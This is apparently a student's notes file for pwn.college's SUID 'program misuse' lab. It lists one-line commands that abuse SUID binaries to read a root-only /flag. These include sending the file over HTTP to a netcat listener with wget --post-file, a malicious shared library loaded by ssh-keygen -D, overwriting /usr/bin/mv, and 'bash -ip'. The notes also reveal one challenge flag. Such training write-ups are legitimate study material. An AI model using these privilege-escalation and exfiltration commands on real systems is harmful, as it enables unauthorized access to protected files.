# If you want to open a man page in vim - use ```man grep | vim - ``` from command line 
# or if you have vim already opened, put cursor the word which you want man page of , then press K


# Ctrl + J to focus on coding page
# Ctrl + `  to go into terminal `




# The file /etc/group contains all the groups defined in the system
# You can use the command “groups” to find all the groups you are a member of
# You can use the command newgrp to work as a member a group other than your default group
# You cannot have 2 groups owning the same file.
# You do not have nested groups in Linux. One group cannot be sub-group of other
# x- eXecuting a directory means Being allowed to “enter” a dir and gain possible access to sub-dirs

# suid value in chmod - https://linuxhint.com/special-permissions-suid-guid-sticky-bit/




# always search for owner in man page - because if we can set --owner=hacker then we can read the content of file even with cat also 
# also search for exec/commands , so that you can execute commands with the help of that tool
# also search for file, so that you can pass that file to read something


# If you dont find anything for privilege escalation then try this website , only if all doors get closed 
## https://gtfobins.github.io/gtfobins/mv/

## when you run strace on a suid program , it will not run as root, it will drop elevated privileges 

# 7 = vim -R flag
# 8 = emacs flag
# 9 = nano flag
# 10 = rev flag | rev 

# 11 = od -t a flag | tr -s ' ' | cut -d " " -f 2- --output-delimiter=''

# 12 = hd flag | awk '{print $NF}' | xargs | tr -d '| '

# 13 = xxd /flag | awk '{print $NF}' | xargs | tr -d ' '

# 14 = base32 flag | base32 -d 

# 15 = pwn.college{Y_WcSN1t1JzNv8kH2FpiLkpfvO3.QX3UTMskzMxUzW}

# 16 = split flag; cat xaa

# 17 = gzip -c flag | gzip -d 

# 18 = bzip2 -c flag | bzip2 -d

# 19 = zip -r /home/hacker/flag.zip flag ; cd /home/hacker;unzip flag.zip;cat flag

# 20 = tar --owner=1000 -cvf /home/hacker/archive.tar flag
## tar -xvf archive.tar
### cat flag

### Very Important NoTe !!! - Notice that the -f needs to go immediately before the archive name but after the --exclude options in this Makefile multi-line example...


# 21 = ar r /home/hacker/flag.a flag; cd /home/hacker; ar xv flag.a ; cat flag

# 22 = ls fl* | cpio -ov --owner=hacker > /home/hacker/Desktop/flag1.cpio; cd /home/hacker/Desktop/;cpio -iv < flag1.cpio ; cat flag

# 23 = genisoimage --help 2>&1 | grep FILE | tr -s ' ' | cut -d " " -f 2 | while read line; do genisoimage $line /flag aa 2>&1;done | grep pwn.college

## you can also $line at the end to see which argument caused priv escalation , and in this case it was -sort 
## genisoimage -sort /flag aa


## https://youtu.be/14mIjpOXnrM?t=775 
## genisoimage --help 2>&1 | grep FILE try using this to get some hints

## genisoimage is dropping privs before it tries to read flag

## Oh yea, so you can’t generate an iso, so look at the man page see which flag takes in a file. One of the early office hours from this year has a similar hint

## Do it smartly use grep to find the different flags that take a file as an argument

# by kanak
## The solution is actually a 0-day (or N-day in the context of this discord)
## If you search discord for some info about genisoimage, you may be able to find some helpful hints
## for genisoimage take a look at the arguments options, one of them will help you
## genisoimage drops the setuid
## but passing the flag in a specific argument will still show you the flag



# 24 = env cat flag

## Displays the current environment or sets the environment for the execution of a command.

# 25 = find /flag -exec cat flag \;

## try to search for exec commands or something like that 



# 26 = make -f /home/hacker/Makefile

Edit the Makefile like this
all:
	cat /flag

# 27 = nice cat flag

# 28 = timeout 5 cat /flag

# 29 = stdbuf -o 0 cat flag

# 30 = setarch i686 cat /flag 

## since they said on man page, that default is already /bin/sh , so just execute the command

# 31 = watch -x cat flag

# 32 = socat - EXEC:'cat /flag'

# 33 = whiptail --textbox flag 20 20

# 34 = awk '{print}' flag

# 35 = sed 's/Hello/Nano/g' flag

# 36 = ed flag 
then enter 
```p```

# 37 = chown hacker:hacker flag

# 38 = chmod 777 flag

# 39 = cp flag /home/hacker/flag.txt
## make a file in hacker directory already and then copy so that permission will be of hacker only in that dir

# 40 = 
## mv /usr/bin/cat /usr/bin/mv
## now run this binary (babysuid_level40) once again to make mv command suid 
## now run ```mv flag``` and you will get the flag

https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619


# 41 = perl flag.pl 
## open(fh, "/flag") or die "File '$filename' cant be opened";
## $get_flag = <fh>;
## print "$get_flag";

# 42 = python3 flag.py
## f = open("/flag",'r')
## print(f.read())

# 43 = ruby flag.rb
## f  = File.open("/flag")
## flag = f.read
## puts flag

# 44 = bash -ip (i for interactive shell and p for not dropping the privileges)
## check 1st lecture notes in program misuse

# 45 = date -f /flag

# 46 = dmesg -F /flag

# 47 = wc --files0-from=/flag

# 48 = 

# 1st method = gcc -x c /flag

## Compilation can involve up to four stages: preprocessing, compilation proper, assembly and linking, always in that order.

## gcc determines where to start with the process depending which suffix is given , if .c suffix is given it will start with preprocessing , so we can chose where to start with -x flag if no suffix is given

# 2nd method = ln -s /flag ~/flaglink.c ; gcc ~/flaglink.c



## I have some questions about gcc. The file needs to be compiled to run but after compiling, the file would become another program and does not have the suid flag?

## Correct, but do you need that/ 

## The class of vulnerabilities that this module exploits are mostly file inclusion attacks Can you figure out a way to do file inclusion here?

## Goes back to what I said earlier, one of the most powerful things an attacker can have access to is an error message that's under their control

## hint:  file INCLUsion and gcc is rather loud when it encounters code it can't parse




# 49 = as flag

# 50 = wget --post-file=/flag http://localhost:1234
# nc -lvnp 1234

## so what we do is , we send the file and recieve the post file content with the help of netcat


# hints for wget - 

## wget -i /flag - will get a wrong flag , because this option will make everything lowercase, but the flag is mixed case 

## you cant host python3 server on localhost and get the flag because - Since you are running the python server under user hacker, you won't have the permissions required to read the flag. Could you use wget and that same python server another way? Wget has the appropriate privilage level to read the flag

## Python doesn't have the suid bit, so it can't read the flag owned by root to send it to wget. You're on the right track, but remember that wget is the executable you have to use to read the file

## the problem i'm having is i'm sending post from wget and receiving on nc but not getting post to show up on nc

# 51 = ssh-keygen -D ./lol

## https://www.youtube.com/watch?v=14mIjpOXnrM&t=2887s - explanation by connor 

## https://youtu.be/eQbKkN1SqOE?list=PL-ymxv0nOtqqQzEncNuE6jetlJAiBUda-&t=2997 - explanation by robert which is much neat and clean - recommend this one to watch if stuck 

## we have kind of taken use of plugins - dlopen and dmsym
```
int main()
{
	puts("Hello");
}
int C_GetFunctionList()
{
	puts("I am here");
	sendfile(1,open("/flag",0),0,4096);
}
```
## compile this with ``` gcc -shared script.c -o lol```

## now run this with ```ssh-keygen -D ./lol ``` and done



Help taken - 

level 23 - genisoimage

level 30 - setarch

level 48 - gcc

level 50 - wget

level 51 - ssh-keygen 






# vim usage

## :e make_asm.s -> will open a new asm file and earlier file has already been written to

